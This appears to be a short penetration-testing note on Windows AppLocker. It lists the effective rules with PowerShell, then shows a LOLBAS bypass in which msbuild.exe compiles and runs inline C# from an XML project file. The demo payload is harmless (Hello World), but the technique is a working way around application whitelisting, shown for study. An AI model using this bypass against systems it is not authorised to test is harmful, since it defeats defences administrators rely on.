---
tags:
  - AD
---
AppLocker is a built-in Windows feature that enables application whitelisting. It controls which applications and scripts can run on a computer by enforcing policies delivered via Group Policy. Rules are defined using file properties such as publisher, name, version, hash, or path and can be configured to either allow or block execution. These rules can be applied to specific users or groups.

**List AppLocker rules**
```powershell
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

## Bypassing Policy with LOLBAS
They exist in trusted paths (C:\Windows and C:\Program Files) and may also be digitally signed by Microsoft. 
Examples: [https://lolbas-project.github.io/](https://lolbas-project.github.io/)
**Example**: msbuild.exe
Build and execute a C# project stored in the target XML file:

<details>
  <summary>helloworld.xml</summary>
```
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="MSBuild">
   <MSBuildTest/>
  </Target>
   <UsingTask
    TaskName="MSBuildTest"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
     <Task>
      <Code Type="Class" Language="cs">
        <![CDATA[

            using System;
            using Microsoft.Build.Framework;
            using Microsoft.Build.Utilities;

            public class MSBuildTest : Task, ITask
            {
                public override bool Execute()
                {
                    Console.WriteLine("Hello World");
                    return true;
                }
            }

        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```
</details> 

```powershell
msbuild.exe helloworld.xml
```

![](../../assets/Pasted%20image%2020250605222733.png)